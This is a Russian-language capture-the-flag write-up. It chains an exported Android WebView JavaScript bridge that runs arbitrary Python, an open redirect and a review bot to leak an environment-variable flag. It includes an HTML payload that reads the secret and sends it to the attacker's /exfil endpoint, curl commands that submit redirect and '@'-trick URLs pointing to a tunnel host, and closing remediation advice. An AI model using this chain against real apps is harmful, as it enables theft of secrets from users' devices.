# Pytome — write-up (task7)

**Avito CTF 2026 · категория «Android / mobile»**
**Цель:** слить переменную окружения `FLAG` из мобильного приложения-обучалки Python.
**Дано:** `pytome.apk` (~60 МБ). Бэкенд (не в APK): `https://pytome-57ymra6o.avitoctf.ru`.

## Статус флага

Флаг **не зашит в APK** — он кладётся в окружение приложения на устройстве бота-ревизора и достаётся **рантайм-ликом через бота** (шаги ниже). Значение `avito{...}` появляется на твоём сервере после запуска эксплойта.

---

## Как я до этого дошёл (ход мысли, по шагам)

Это не «одна дырка», а цепочка из 5 звеньев. Вот как она собиралась:

1. **APK на 60 МБ — это подозрительно много.** Распаковал (`unzip`) и увидел `lib/*/libpython3.11.so`, `libchaquopy_java.so`, каталог `assets/chaquopy/`. Вывод: это **Chaquopy** — фреймворк, который встраивает настоящий **CPython 3.11** в Android-приложение. Значит приложение реально исполняет Python **на телефоне**, локально.

2. **Ищем «песочницу» — а её нет.** Раз это «обучалка Python с защитой от пчёл-вайбкодеров», ждёшь фильтр опасного кода. Декомпилировал Java/Kotlin (jadx) и нашёл `PythonEngine.execute(code)`, который делает буквально `builtins.exec(code, ...)` и возвращает то, что напечаталось (через `redirect_stdout`). **Никаких проверок `import`/`os`/`environ` нет.** «Защита» — фейк. То есть если мы сможем прогнать свой Python, то `import os; print(os.environ['FLAG'])` сработает в лоб.

3. **Где вообще берётся FLAG?** В `MainActivity.onCreate`: `getIntent().getStringExtra("FLAG")` → кладётся в `os.environ["FLAG"]`. То есть флаг задаётся **при запуске приложения на устройстве ревизора** (через Intent-extra). У нас на руках APK его нет — нужен рантайм.

4. **Как заставить приложение выполнить НАШ Python?** Смотрю, кто вызывает `execute()`. Это `DocsActivity`: там WebView с `addJavascriptInterface(new PythonBridge(), "AndroidBridge")`, а `@JavascriptInterface eval(code)` → `PythonEngine.execute(code)`. **Значит любой JavaScript в этом WebView может выполнить произвольный Python** через `AndroidBridge.eval(...)`. Осталось подсунуть в WebView свою страницу.

5. **WebView пускает только доверенный хост — обходим open-redirect'ом.** `DocsActivity` (exported, deep link `pytome://docs?url=...`) проверяет, что host стартового URL == `pytome-57ymra6o.avitoctf.ru`. Но клиент — дефолтный `WebViewClient()`, который не переопределяет навигацию, поэтому JS-мост **сохраняется после редиректов**. А на доверенном хосте есть **открытый редирект** `GET /go?to=<любой URL>` (отдаёт 302 куда угодно). Значит `https://pytome-57ymra6o.avitoctf.ru/go?to=https://МОЙ_САЙТ/x.html` проходит host-check, WebView идёт по 302 на мою страницу, а `AndroidBridge` там всё ещё доступен.

6. **Как доставить это боту?** На сайте есть форма `/docs/bug-report` — «пришли ссылку нашему медоеду-ревизору». Бот **автоматически открывает присланный URL в уязвимом приложении** (где FLAG уже в окружении). Круг замкнулся: моя страница → бот открывает через редирект → мой JS читает `os.environ['FLAG']` → отправляет мне.

Итог цепочки: **exported WebView-активити с JS-мостом → произвольный Python → host-check обходится open-redirect'ом → доставку делает бот-ревизор.**

---

## Что делать пошагово (по-человечески)

Тебе нужны: любой компьютер, Python 3, и способ показать боту страницу по HTTPS-ссылке. Проще всего — локальный сервер + туннель `ngrok`.

### Шаг 0. Поставь ngrok
`brew install ngrok` (или скачай с ngrok.com, бесплатного аккаунта хватит).

### Шаг 1. Запусти сервер-ловушку
В репозитории лежит готовый `task7/exploit_server.py` — он одновременно (а) отдаёт страницу-пейлоад `x.html` и (б) логирует то, что придёт на `/exfil` (наш флаг).
```bash
python3 task7/exploit_server.py         # слушает http://127.0.0.1:8000
```

### Шаг 2. Открой туннель наружу
В другом терминале:
```bash
ngrok http 8000
```
Скопируй выданный HTTPS-адрес, например `https://ab12cd34.ngrok-free.app`. Это и есть «МОЙ_САЙТ».

### Шаг 3. Собери ссылку через открытый редирект доверенного хоста
```
https://pytome-57ymra6o.avitoctf.ru/go?to=https://ab12cd34.ngrok-free.app/x.html
```
Именно её увидит host-check приложения (хост = доверенный), а 302 уведёт WebView на твою страницу.

### Шаг 4. Отправь ссылку боту-ревизору
Через веб-форму на `https://pytome-57ymra6o.avitoctf.ru/docs/bug-report` (поле «url»), либо curl'ом:
```bash
curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
     --data-urlencode 'url=https://pytome-57ymra6o.avitoctf.ru/go?to=https://ab12cd34.ngrok-free.app/x.html'
```
Появится «ЗАЯВКА #…, ожидаем ревизора». Rate-limit ~1 заявка в минуту.

### Шаг 5. Лови флаг
Через несколько секунд бот откроет ссылку в приложении, твой JS выполнит `os.environ['FLAG']` и стукнет на `/exfil`. В терминале с `exploit_server.py` увидишь строку вида:
```
[FLAG] avito{...}
```

Если не пришло за пару минут — проверь, что ngrok-URL живой и вставлен верно, и что заявка прошла (не словил rate-limit). Можно отправить повторно.

---

## Что делает страница-пейлоад (для понимания)

`x.html`, который отдаёт сервер, — это по сути:
```html
<script>
  // AndroidBridge появляется ТОЛЬКО когда страницу открыл бот в приложении
  try {
    var f = AndroidBridge.eval("import os\nprint(os.environ.get('FLAG',''))");
    new Image().src = "/exfil?f=" + encodeURIComponent(f);   // шлём флаг себе
  } catch (e) {
    new Image().src = "/err?e=" + encodeURIComponent(e);
  }
</script>
```
Фильтра нет, поэтому `import os; print(os.environ['FLAG'])` работает напрямую (на всякий случай в скрипте есть и filter-resilient вариант через `__import__`). Обычный браузер `AndroidBridge` не имеет — сработает только внутри приложения у бота. `usesCleartextTraffic=true`, так что http-exfil тоже прошёл бы.

## Где логика в декомпиляции (пути)

- Распаковка: `task7/extracted/`.
- `PythonEngine.java` — `execute()` (голый `exec`, без фильтра) и `setEnv()` (кладёт FLAG в `os.environ`).
- `MainActivity.java` — чтение Intent-extra `FLAG`.
- `DocsActivity.java` — WebView + `AndroidBridge.eval`, слабая host-проверка.
- `AndroidManifest.xml` — обе Activity `exported=true`, deep link `pytome://docs`.
- Бэкенд: `/docs/*` (страницы дергают `AndroidBridge.eval`), `/go?to=` (open redirect), `/docs/bug-report` (бот).

## Мораль

Опасна связка `addJavascriptInterface` + `setJavaScriptEnabled(true)` на **exported**-активити с deep link, где мост исполняет произвольный код, а «allowlist» проверяет только СТАРТОВЫЙ URL. Открытый редирект на доверенном домене обнуляет host-проверку. Правильно: не вешать нативные мосты на недоверенный контент; проверять КАЖДУЮ навигацию в `WebViewClient.shouldOverrideUrlLoading`; не экспортировать активити с мостом; убрать open-redirect.

https://pytome-57ymra6o.avitoctf.ru/go?to=https://powerful-fate-indirect-eleven.trycloudflare.com/x.html

curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
     --data-urlencode 'url=https://pytome-57ymra6o.avitoctf.ru/go?to=https://pytome-57ymra6o.avitoctf.ru/go?to=https://powerful-fate-indirect-eleven.trycloudflare.com/x.html'

curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
  --data-urlencode 'name=medoedik' \
  --data-urlencode 'email=medoedik@avito.ru' \
  --data-urlencode 'url=https://powerful-fate-indirect-eleven.trycloudflare.com\@pytome-57ymra6o.avitoctf.ru/x' \
  --data-urlencode 'bug_type=other' \
  --data-urlencode 'description=review'